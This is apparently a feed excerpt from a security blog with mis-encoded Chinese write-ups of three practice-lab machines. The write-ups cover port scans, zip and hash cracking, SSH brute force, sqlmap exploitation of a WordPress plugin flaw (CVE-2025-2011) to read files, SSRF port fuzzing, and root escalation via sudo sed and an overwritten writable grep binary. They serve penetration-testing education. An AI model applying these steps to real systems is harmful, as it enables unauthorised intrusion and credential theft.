negotiation to server 192.168.56.87 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE\nUnable to connect with SMB1 -- no workgroup available\n```\n\n`backup`é‡Œé¢æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä¸‹è½½\n\n![image.png](/post-images/TheHackersLabsSedition/image1.png)\n\n## ZIP Crack\n\nè§£å‹å‹ç¼©åŒ…éœ€è¦å¯†ç \n\n```bash\nâœ  Sedition unzip secretito.zip  \nArchive:  secretito.zip\n[secretito.zip] password password: \n   skipping: password                incorrect password\n```\n\n`john`è½¬æ¢åçˆ†ç ´\n\n```bash\nâœ  Sedition zip2john secretito.zip > ziphash.txt                                 \nver 1.0 efh 5455 efh 7875 secretito.zip/password PKZIP Encr: 2b chk, TS_chk, cmplen=34, decmplen=22, crc=F2E5967A ts=969D cs=969d type=0\n\nâœ  Sedition john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt         \nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nsebastian        (secretito.zip/password)     \n1g 0:00:00:00 DONE (2025-07-14 21:40) 50.00g/s 819200p/s 819200c/s 819200C/s 123456..cocoliso\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n\nè§£å‹åå¾—åˆ°ä¸€ä¸ªå¯†ç  `elbunkermolagollon123`\n\n![image.png](/post-images/TheHackersLabsSedition/image2.png)\n\nè¿™é‡Œå°è¯•äº†å¾ˆå¤šç”¨æˆ·åå°è¯•ç™»å½•`SMB`ï¼Œä½†æ˜¯éƒ½æ˜¯å¤±è´¥äº†\n\n## ç«¯å£æ‰«æ v2\n\nå†æšä¸¾ä¸€ä¸‹ç«¯å£\n\nUDP\n\n```bash\nâœ  Sedition nmap -sU -min-rate 5000 192.168.56.87\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:46 CST\nNmap scan report for 192.168.56.87\nHost is up (0.00022s latency).\nNot shown: 993 open|filtered udp ports (no-response)\nPORT      STATE  SERVICE\n137/udp   open   netbios-ns\n5353/udp  closed zeroconf\n17845/udp closed unknown\n25375/udp closed unknown\n41702/udp closed unknown\n46093/udp closed unknown\n51456/udp closed unknown\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.74 seconds\n```\n\nTCP æ‰€æœ‰ç«¯å£\n\n```bash\nâœ  Sedition nmap -sT -min-rate 10000 -p- 192.168.56.87\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:48 CST\nNmap scan report for 192.168.56.87\nHost is up (0.00037s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n65535/tcp open  unknown\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 17.75 seconds\n```\n\nå¤šäº†ä¸ª `65535` ï¼Œæ‰«æä¸€ä¸‹è¯¦ç»†ä¿¡æ¯\n\n```bash\nâœ  Sedition nmap -sT -A -p 65535 192.168.56.87\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:50 CST\nNmap scan report for 192.168.56.87\nHost is up (0.00040s latency).\n\nPORT      STATE SERVICE VERSION\n65535/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey: \n|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)\n|_  256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.41 ms 192.168.56.87\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.32 seconds\n```\n\nOhyaï¼ŸSSHï¼Œ`hydra`çˆ†ç ´ä¸€ä¸‹ç”¨æˆ·å\n\n```bash\nhydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  -p elbunkermolagollon123 -t 12 -s 65535 -Vv 192.168.56.87 ssh  \n```\n\nå¾—åˆ°ç”¨æˆ·å `cowboy`\n\n![image.png](/post-images/TheHackersLabsSedition/image3.png)\n\n## æƒé™æå‡\n\n### In cowboy shell\n\næŸ¥çœ‹`sudo`æƒé™\n\n```bash\ncowboy@Sedition:~$ sudo -l\n[sudo] contraseÃ±a para cowboy: \nSorry, user cowboy may not run sudo on sedition.\n```\n\nå¯»æ‰¾`sid`æƒé™æ–‡ä»¶\n\n```bash\ncowboy@Sedition:~$ find / -perm -u=s -type f 2>/dev/null\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/mount\n```\n\nçªç„¶æ³¨æ„åˆ°`.bash_history` æ²¡æœ‰è¢«é‡å®šå‘åˆ° `/dev/null`\n\n```bash\ncowboy@Sedition:~$ ls -al\ntotal 24\ndrwx------ 2 cowboy cowboy 4096 jul  6 20:08 .\ndrwxr-xr-x 4 root   root   4096 jul  6 18:56 ..\n-rw------- 1 cowboy cowboy   78 jul 14 16:09 .bash_history\n-rw-r--r-- 1 cowboy cowboy  220 jul  6 18:56 .bash_logout\n-rw-r--r-- 1 cowboy cowboy 3526 jul  6 18:56 .bashrc\n-rw-r--r-- 1 cowboy cowboy  807 jul  6 18:56 .profile\ncowboy@Sedition:~$ cat .bash_history \nhistory\nexit\nmariadb\nmariadb -u cowboy -pelbunkermolagollon123\nsu debian\nexit\n```\n\næ‰’æ‹‰ `users` è¡¨\n\n```bash\nMariaDB [bunker]> select * from users;\n+--------+----------------------------------+\n| user   | password                         |\n+--------+----------------------------------+\n| debian | 7c6a180b36896a0a8c02787eeafb0e4c |\n+--------+----------------------------------+\n1 row in set (0,000 sec)\n```\n\nçˆ†ç ´å¯†ç \n\n```bash\nâœ  Sedition john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash \nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support for this hash type, consider --fork=8\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword1        (?)     \n1g 0:00:00:00 DONE (2025-07-14 22:17) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..michael1\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed. \n```\n\n### In debian shell\n\nå½“å‰ç”¨æˆ·å®¶ç›®å½•ä¸‹èƒ½æ‹¿åˆ° `user.txt`\n\n```bash\ndebian@Sedition:~$ cat flag.txt \npixxxxxxxxxxxxxxxxxxxxxx\n```\n\n`sudo` æƒé™\n\n```bash\ndebian@Sedition:~$ sudo -l\nMatching Defaults entries for debian on sedition:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser debian may run the following commands on sedition:\n    (ALL) NOPASSWD: /usr/bin/sed\n```\n\nç»“æŸï¼šhttps://gtfobins.github.io/gtfobins/sed/\n\n![image.png](/post-images/TheHackersLabsSedition/image4.png)\n\nè¯»å– `root.txt`\n\n```bash\n# cat root.txt\nlaxxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## æ€»ç»“\n\nè¶…çº§å¸¸è§„",
            "url": "https://www.sunsetaction.top/2025/07/14/TheHackersLabsSedition",
            "title": "TheHackersLabs - Sedition",
            "summary": "Sedition https://labs.thehackerslabs.com/machine/117 Recon æ‰«æå‡ºæ¥æ˜¯éå¸¸è§„ç«¯å£ æ²¡æœ‰Webç«¯å£ï¼Œæˆ‘ä»¬åªèƒ½ä»SMBä¸Šæ‰‹ é¦–å…ˆå°è¯•ä½¿ç”¨åŒ¿åè´¦æˆ·è¿›è¡Œè®¿é—® backupé‡Œé¢æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä¸‹è½½ ZIP Crack è§£å‹å‹ç¼©åŒ…éœ€è¦å¯†ç  johnè½¬æ¢åçˆ†...",
            "date_modified": "2025-07-14T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Linux",
                "SMB",
                "ZIPcrack",
                "sed"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/14/HackMyVMXimai",
            "content_html": "\n# Ximai\n\n> https://hackmyvm.eu/machines/machine.php?vm=Ximai\n> \n\nNotesï¼š**More than one path to initial access.**\n\n![image.png](/post-images/HackMyVMXimai/image.png)\n\nPS: é¶æœºçš„æ–‡ä»¶å¤¹åå­—æ˜¯`Ximai`ï¼Œä¸æ˜¯`Ximia`ï¼Œåšçš„æ—¶å€™æ‰“é”™äº†ã€‚\n\n## Recon\n\n```bash\nâœ  Ximia nmap -sT -min-rate 10000 192.168.56.62 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 20:32 CST\nNmap scan report for 192.168.56.62\nHost is up (0.0012s latency).\nNot shown: 996 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n8000/tcp open  http-alt\nMAC Address: 08:00:27:91:AC:2B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.50 seconds\n```\n\n```bash\nâœ  Ximia nmap -sT -A -p 22,80,3306,8000 192.168.56.62\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 20:33 CST\nNmap scan report for 192.168.56.62\nHost is up (0.0036s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Apache2 Ubuntu Default Page: It works\n3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)\n8000/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: NeonGrid Solutions\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-generator: WordPress 6.8.1\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:91:AC:2B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   3.57 ms 192.168.56.62\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 36.01 seconds\n```\n\nè®¿é—® `HTTP` ï¼Œ`80`ç«¯å£æ˜¯é»˜è®¤é¡µé¢\n\n![image.png](/post-images/HackMyVMXimai/image1.png)\n\n`8080`ç«¯å£æ˜¯`wordpress`ï¼Œå¹¶ä¸”ç»™å‡ºäº†ä¸€ä¸ªä¿¡æ¯\n\n![image.png](/post-images/HackMyVMXimai/image2.png)\n\nä¿¡æ¯æ˜¯ï¼š\n\n![image.png](/post-images/HackMyVMXimai/image3.png)\n\n`80`ç«¯å£æ‰«æä¸€ä¸‹ç›®å½•ï¼Œ`8000`ç«¯å£ç›´æ¥ä¸Š`WPScan`\n\n```bash\nâœ  Ximia feroxbuster --url http://192.168.56.62 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503 -x php,zip,txt\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher ğŸ¤“                 ver: 2.11.0\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ¯  Target Url            â”‚ http://192.168.56.62\n ğŸš€  Threads               â”‚ 50\n ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [404, 503]\n ğŸ’¥  Timeout (secs)        â”‚ 7\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ true\n ğŸ’²  Extensions            â”‚ [php, zip, txt]\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ 4\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET     1022l     5262w    85827c http://192.168.56.62/info.php\n[>-------------------] - 1s      1233/882208  39m     found:1       errors:2      \n[>-------------------] - 1s      1148/882180  840/s   http://192.168.56.62/                \n200      GET      376l      965w    10938c http://192.168.56.62/\n200      GET       37l      185w    19268c http://192.168.56.62/that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg\n200      GET        4l       31w      167c http://192.168.56.62/that-place-where-i-put-that-thing-that-time/creds.txt\n[####################] - 6m    882228/882228  0s      found:5       errors:2      \n[####################] - 6m    882180/882180  2628/s  http://192.168.56.62/ \n[####################] - 0s    882180/882180  32673333/s http://192.168.56.62/that-place-where-i-put-that-thing-that-time/ => Directory listing (add --scan-dir-listings to scan)  \n```\n\nä¸‹é¢æ˜¯`80`ç«¯å£ä¸­æ‰«æå‡ºæ¥çš„é¡µé¢\n\n![image.png](/post-images/HackMyVMXimai/image4.png)\n\n(?è¯´æˆ‘å—ğŸ˜­)\n\n![image.png](/post-images/HackMyVMXimai/image5.png)\n\nè¿™ä¸ª`creds.txt`å¯èƒ½è¿˜æœ‰ç‚¹ç”¨ï¼Œå› ä¸º`mysqli.allow_local_infile`ä¹Ÿå¼€å¯ç€ï¼Œå¯ä»¥é€šè¿‡æ•°æ®åº“å»è¯»\n\n![image.png](/post-images/HackMyVMXimai/image6.png)\n\næ¥ä¸‹æ¥çœ‹`Wpscan` çš„ç»“æœï¼Œæ‰«æåˆ°å­˜åœ¨ `SQL`æ³¨å…¥ï¼Œ`CVE-2025-2011`\n\n![image.png](/post-images/HackMyVMXimai/image7.png)\n\n## CVE-2025-2011\n\nPOCï¼šhttps://github.com/datagoboom/CVE-2025-2011\n\nä½†æ˜¯è¿™é‡Œé€šè¿‡`POC`æ— æ³•è¿›è¡Œåˆ©ç”¨\n\n![image.png](/post-images/HackMyVMXimai/image8.png)\n\næˆ‘ä»¬è§‚å¯Ÿ`POC`ï¼Œå°è¯•ä½¿ç”¨`SQLmap`æ¥æ‰«\n\n![image.png](/post-images/HackMyVMXimai/image9.png)\n\n```bash\nsqlmap -u \"http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test*&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index\" -batch  \n```\n\n![image.png](/post-images/HackMyVMXimai/image10.png)\n\nè¿™æ ·å°±å¯ä»¥æ‰«æå‡ºæ¥äº†ï¼Œæˆ‘ä»¬æ ¹æ®å‰é¢çš„çº¿ç´¢æ¥ç›´æ¥è¯»å–æ–‡ä»¶ `/etc/jimmy.txt`\n\n```bash\nsqlmap -u \"http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test*&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index\" -batch --file-read /etc/jimmy.txt\n```\n\n```bash\nâœ  files cat _etc_jimmy.txt \nHandsomeHU\n```\n\n`ssh` ç™»å½•\n\n![image.png](/post-images/HackMyVMXimai/image11.png)\n\n## æƒé™æå‡\n\nå½“å¤´ä¸€æ£’\n\n```bash\njimmy@Ximai:~$ ls\nsorry, you are restricted from using this command.\n```\n\næŸ¥çœ‹ç¯å¢ƒå˜é‡\n\n```bash\njimmy@Ximai:~$ echo $PATH\n./...\n```\n\nç›´æ¥æ¢å¤ä¸€ä¸‹ç¯å¢ƒå˜é‡å°±è¡Œäº†\n\n```bash\njimmy@Ximai:~$ export PATH=\"/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\"\n```\n\nå½“å‰ç›®å½•ä¸‹èƒ½è¯»å–`user.txt`\n\n```bash\njimmy@Ximai:~$ cat us3r.txt \nflag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}\n```\n\næŸ¥çœ‹`sudo`æƒé™\n\n```bash\njimmy@Ximai:~$ sudo -l\n\nWe trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n\n[sudo] password for jimmy: \nSorry, user jimmy may not run sudo on Ximai.\n```\n\næŸ¥çœ‹`wp-config.php`\n\n```bash\n/** Database username */\ndefine( 'DB_USER', 'root' );       \n                                                                                                \n/** Database password */                                                                        \ndefine( 'DB_PASSWORD', 'SuperSecret' ); \n```\n\næ•°æ®åº“è¡¨ä¿¡æ¯\n\n```bash\nMariaDB [wordpress]> select * from wp_users;\n+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+\n| ID | user_login | user_pass                                                       | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name |\n+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+\n|  1 | adminer    | $wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq | adminer       | no@thankyou.com |          | 2025-05-28 10:35:26 |                     |           0 | adminer      |\n+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+\n1 row in set (0.000 sec)\n```\n\nå°è¯•å¯†ç çˆ†ç ´ï¼Œè¿™é‡Œä½¿ç”¨`rockyou`æ— æ³•çˆ†ç ´å‡ºæ¥ï¼Œå¤ªæ…¢äº†\n\n```bash\nâœ  Ximia john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n```\n\nä½¿ç”¨`cupp`ç”Ÿæˆå¼±å¯†ç å­—å…¸è¿›è¡Œå°è¯•\n\n![image.png](/post-images/HackMyVMXimai/image12.png)\n\nä¹Ÿä¸èƒ½ç ´è§£ï¼Œæˆ‘ä»¬é€šè¿‡`top 100`åŠ ä¸Šç”¨æˆ·ååˆ¶ä½œå­—å…¸\n\n```bash\nâœ  Ximia cat /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt | awk '{print \"adminer\"$1}' > maybe.txt\n```\n\nå¾—åˆ°å¯†ç  `adminer123456`\n\n![image.png](/post-images/HackMyVMXimai/image13.png)\n\næŸ¥çœ‹ `sudo` æƒé™\n\n```bash\nadminer@Ximai:~$ sudo -l\nMatching Defaults entries for adminer on Ximai:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser adminer may run the following commands on Ximai:\n    (ALL) NOPASSWD: /usr/bin/grep\n```\n\n```bash\nadminer@Ximai:~$ sudo /usr/bin/grep \nsorry, you are restricted from using this command.try egrep instead.\n```\n\n666å­—ç¬¦ä¸²\n\n```bash\nadminer@Ximai:~$ cat /usr/bin/grep\necho 'sorry, you are restricted from using this command.try egrep instead.'\n```\n\næŸ¥çœ‹æƒé™ï¼Œæœ‰å†™å…¥æƒé™\n\n```bash\nadminer@Ximai:~$ ls -al /usr/bin/grep\n-rwxr-xrwx 1 root root 76 May 28 09:06 /usr/bin/grep\n```\n\nç›´æ¥æ¢­å“ˆ\n\n```bash\nadminer@Ximai:~$ cat /bin/bash > /usr/bin/grep\nadminer@Ximai:~$ sudo grep\nroot@Ximai:/home/adminer# \n```\n\nè¯»å– `root.txt`\n\n```bash\nroot@Ximai:~# cat r00t.txt \nflag{root-126e5653-3b02-11f0-b074-000c2921b441}\n```",
            "url": "https://www.sunsetaction.top/2025/07/14/HackMyVMXimai",
            "title": "HackMyVM - Ximai",
            "summary": "Ximai https://hackmyvm.eu/machines/machine.php?vm=Ximai Notesï¼šMore than one path to initial access. PS: é¶æœºçš„æ–‡ä»¶å¤¹åå­—æ˜¯Ximaiï¼Œä¸æ˜¯Ximiaï¼Œåšçš„æ—¶å€™æ‰“é”™äº†ã€‚ Recon è®¿é—® HTTP ...",
            "date_modified": "2025-07-14T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackMyVM",
                "Linux",
                "WordPress",
                "CVE-2025-2011",
                "Password_generator"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/05/TryHackMeCreative",
            "content_html": "\n# Creative\n\n> https://tryhackme.com/room/creative | `Easy`\n> \n\ninfoï¼šExploit a vulnerable web application and some misconfigurations to gain root privileges.\n\n![image.png](/post-images/TryHackMeCreative/image.png)\n\n## Recon\n\n```bash\nâœ  Creative nmap -sT -min-rate 10000 10.10.96.159             \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 22:02 CST\nNmap scan report for 10.10.96.159\nHost is up (0.35s latency).\nNot shown: 998 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 2.65 seconds\n```\n\n```bash\nâœ  Creative nmap -sT -A -p 22,80 10.10.96.159                                                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 22:03 CST\nNmap scan report for 10.10.96.159\nHost is up (0.35s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 8d:ff:e3:db:ba:78:82:20:fc:2c:97:dc:21:21:7e:ad (RSA)\n|   256 89:7a:de:66:81:14:cd:ea:a8:46:a4:57:31:d8:d2:cf (ECDSA)\n|_  256 07:78:87:81:7b:69:a7:d2:8b:5d:45:79:5d:85:cd:ca (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://creative.thm\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)\nOS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5\nAggressive OS guesses: Linux 4.15 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 4 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   216.65 ms 10.2.0.1\n2   ... 3\n4   343.32 ms 10.10.96.159\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 29.57 seconds\n```\n\nè®¿é—®`HTTP`\n\n![image.png](/post-images/TryHackMeCreative/image1.png)\n\nç»è¿‡ä¸€ç•ªæœç´¢æ²¡æ³•å‘ç°å¯ä»¥åˆ©ç”¨çš„ï¼Œæ‰«æä¸€ä¸‹å­åŸŸå\n\n```bash\nâœ  Creative ffuf -u 'http://creative.thm' -H 'host: FUZZ.creative.thm' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs=178\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://creative.thm\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.creative.thm\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 178\n________________________________________________\n\nbeta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 374ms]\n:: Progress: [14512/114442] :: Job [1/1] :: 117 req/sec :: Duration: [0:02:08] :: Errors: 0 ::\n```\n\nå¾—åˆ°`beta`ï¼Œè®¿é—®\n\n![image.png](/post-images/TryHackMeCreative/image2.png)\n\n## SSRF\n\nçœ‹ç€åƒæ˜¯`SSRF`ï¼Œè¾“å…¥æˆ‘ä»¬`IP`å°è¯•\n\n```bash\nâœ  Creative nc -lvp 80  \nlistening on [any] 80 ...\nconnect to [10.2.7.57] from creative.thm [10.10.96.159] 33820\nGET / HTTP/1.1\nHost: 10.2.7.57\nUser-Agent: python-requests/2.28.2\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\n```\n\nè¾“å…¥`127.0.0.1`\n\n![image.png](/post-images/TryHackMeCreative/image3.png)\n\nç›´æ¥çˆ†ç«¯å£\n\n```bash\nâœ  Creative seq 2000 > ports\n```\n\n```bash\nâœ  Creative ffuf -u 'http://beta.creative.thm' -X POST -d 'url=http://127.0.0.1:FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w ports -fs=13\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : POST\n :: URL              : http://beta.creative.thm\n :: Wordlist         : FUZZ: /root/Desktop/TryHackMe/Creative/ports\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Data             : url=http://127.0.0.1:FUZZ\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: 